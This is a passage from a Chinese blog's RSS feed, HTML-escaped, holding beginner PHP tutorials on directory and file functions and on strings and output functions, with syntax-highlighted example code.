&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;提交&amp;#34;&lt;/span> /&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/&lt;span style="color:#f92672">form&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/&lt;span style="color:#f92672">body&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/&lt;span style="color:#f92672">html&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>服务端设置&lt;/p></description></item><item><title>PHP 之目录与文件</title><link>https://wyb0.cn/posts/2016/php-directory-and-file/</link><pubDate>Sun, 22 May 2016 16:29:47 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-directory-and-file/</guid><description>&lt;h3 id="0x00-目录的操作">0x00 目录的操作&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/var/www/html/php/dir.php&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">dirname&lt;/span>($path)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span>; &lt;span style="color:#75715e">//返回上级路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">basename&lt;/span>($path)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span>; &lt;span style="color:#75715e">//返回文件名部分
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">print_r&lt;/span>(&lt;span style="color:#a6e22e">pathinfo&lt;/span>($path)); &lt;span style="color:#75715e">//返回包含path信息的数组
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//readdir()从目录句柄读取条目，返回目录中的文件名，指针依次向后移动
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;D:/phpStudy/WWW/php&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $dh &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">opendir&lt;/span>($path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">false&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> ($filename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>($dh))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> $filename&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rewinddir&lt;/span>($dh); &lt;span style="color:#75715e">//指针复位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">readdir&lt;/span>($dh);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">closedir&lt;/span>($dh);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">mkdir&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;./aaa&amp;#34;&lt;/span>);&lt;span style="color:#75715e">//创建文件夹aaa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">rmdir&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;./aaa&amp;#34;&lt;/span>);&lt;span style="color:#75715e">//删除文件夹aaa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">file_put_contents&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;aa.php&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>);&lt;span style="color:#75715e">//创建文件aa.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">unlink&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;./aa.php&amp;#34;&lt;/span>);&lt;span style="color:#75715e">//删除文件aa.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;center>
![箭头](/img/post/arrow.png)&lt;br />
![目录的操作](/img/post/dir.png)
&lt;/center>
&lt;h3 id="0x01-文件的读写">0x01 文件的读写&lt;/h3>
&lt;ol>
&lt;li>fopen(filename,mode)和fclose(filename,mode)
&lt;img src="https://wyb0.cn/img/post/file_open_mode.png" alt="fopen()打开文件的模式">&lt;/li>
&lt;/ol>
&lt;h4 id="例子">例子：&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;test.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/home/test/test.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/home/test/test.gif&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;wb&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;http://www.example.com/&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ftp://user:password@example.com/test.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;w&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>读取内容&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fread&lt;/span>(&lt;span style="color:#a6e22e">h_file&lt;/span>,&lt;span style="color:#a6e22e">length&lt;/span>) &lt;span style="color:#75715e">//读取打开文件的length个字节，返回读取的字符串 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">fgets&lt;/span>(&lt;span style="color:#a6e22e">h_file&lt;/span>,&lt;span style="color:#a6e22e">length&lt;/span>) &lt;span style="color:#75715e">//读取一行返回length个字节，不加length时默认1024个字节，失败返回false 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">fgetc&lt;/span>(&lt;span style="color:#a6e22e">h_file&lt;/span>) &lt;span style="color:#75715e">//逐字读取
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>file_get_content()和file_put_content()&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">file_get_content&lt;/span>($filename)&lt;span style="color:#a6e22e">可以得到文件中的所有内容&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">file_put_content&lt;/span>($filename, $str)&lt;span style="color:#a6e22e">可以将字符串覆盖写入文件中&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">file_put_content&lt;/span>($filename, $str, &lt;span style="color:#a6e22e">FILE_APPEND&lt;/span>)&lt;span style="color:#a6e22e">可以将字符串追加到文件中&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>filetype()&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">filetype&lt;/span>($filename)&lt;span style="color:#a6e22e">可以得到文件的类型&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-查看文件夹下的文件信息">0x02 查看文件夹下的文件信息&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;./&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	$filelist&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;filesystem.php&amp;#34;&lt;/span>);&lt;span style="color:#75715e">//要过滤掉的文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">//浏览指定目录下的文件，并使用表格输出
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">//path目录信息的过滤，判断path存在，并且是否是个目录
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">file_exists&lt;/span>($path) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">is_dir&lt;/span>($path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">die&lt;/span>($path&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;目录无效！&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">//2. 输出表头信息
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;h3&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>$path&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">目录下的文件信息&amp;lt;h3&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;table width=&amp;#39;600&amp;#39; border=&amp;#39;0&amp;#39;&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;tr bgcolor=&amp;#39;#cccccc&amp;#39; align=&amp;#39;left&amp;#39;&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;th&amp;gt;序号&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;名称&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;类型&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;大小&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;创建时间&amp;lt;/th&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;/tr&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">//打开这个目录，并遍历目录下面的所有文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	$dir &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">opendir&lt;/span>($path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>($dir){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$i&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//遍历目录中的文件,并输出文件的信息
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>		&lt;span style="color:#66d9ef">while&lt;/span>($f &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">readdir&lt;/span>($dir)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">if&lt;/span>($f&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> $f&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;..&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">in_array&lt;/span>($f,$filelist)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#66d9ef">continue&lt;/span>;&lt;span style="color:#75715e">//跳出本次循环，继续下一次遍历。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			$file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">trim&lt;/span>($path,&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$f;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			$i&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;tr&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>$i&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;lt;/td&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>$f&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;lt;/td&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;td&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">filetype&lt;/span>($file)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;lt;/td&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;td&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">filesize&lt;/span>($file)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;lt;/td&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;td&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Y-m-d H:i:s&amp;#34;&lt;/span>,&lt;span style="color:#a6e22e">filectime&lt;/span>($file))&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;lt;/td&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;/tr&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#a6e22e">closedir&lt;/span>($dir); &lt;span style="color:#75715e">//关闭目录
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;tr bgcolor=&amp;#39;#cccccc&amp;#39; align=&amp;#39;left&amp;#39;&amp;gt;&amp;lt;td colspan=&amp;#39;6&amp;#39;&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;/table&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;center>
![箭头](/img/post/arrow.png)&lt;br />
![查看文件夹下的文件信息](/img/post/file_info.png)
&lt;/center></description></item><item><title>PHP 之字符串</title><link>https://wyb0.cn/posts/2016/php-string/</link><pubDate>Sat, 21 May 2016 23:16:28 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-string/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;ol>
&lt;li>字符串可以使用数组的处理函数操作，但并不是真正的数组&lt;/li>
&lt;li>双引号中的变量用{}括起来，因为字符串中若遇到$符号，解析器会尽可能多的获取后面的字符以组成一个合法的变量名&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $lamp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;os&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Linux&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;webserver&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Apache&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;db&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Mysql&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;language&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;PHP&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;A OS is &lt;/span>&lt;span style="color:#e6db74">$lamp[os]&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">// ok
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;A OS is &lt;/span>&lt;span style="color:#e6db74">$lamp[&amp;#39;os&amp;#39;]&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;A OS is &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>$lamp[&lt;span style="color:#e6db74">&amp;#39;os&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">//ok
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;A OS is &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>$lamp[&lt;span style="color:#a6e22e">os&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">// ok
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;This square is &lt;/span>&lt;span style="color:#e6db74">$square-&amp;gt;width&lt;/span>&lt;span style="color:#e6db74"> meters broad.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">//ok
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;This square is &lt;/span>&lt;span style="color:#e6db74">$square-&amp;gt;width&lt;/span>&lt;span style="color:#e6db74"> meters broad.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">//ok
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;This square is &lt;/span>&lt;span style="color:#e6db74">$square-&amp;gt;width&lt;/span>&lt;span style="color:#e6db74"> meters broad.&amp;#34;&lt;/span>; &lt;span style="color:#75715e">//ok
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-常用字符串输出函数">0x01 常用字符串输出函数&lt;/h3>
&lt;blockquote>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: left">函数名&lt;/th>
 &lt;th style="text-align: left">功能描述&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: left">echo&lt;/td>
 &lt;td style="text-align: left">输出字符串&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">print()&lt;/td>
 &lt;td style="text-align: left">输出一个或多个字符串&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">die()&lt;/td>
 &lt;td style="text-align: left">输出一条消息，并退出当前脚本&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">printf()&lt;/td>
 &lt;td style="text-align: left">输出格式化字符串&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">sprintf()&lt;/td>
 &lt;td style="text-align: left">把格式化字符串写入到一个变量中&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;/blockquote>
&lt;h3 id="0x02-函数echo">0x02 函数echo()&lt;/h3>
&lt;p>输出一个或多个字符串&lt;br>
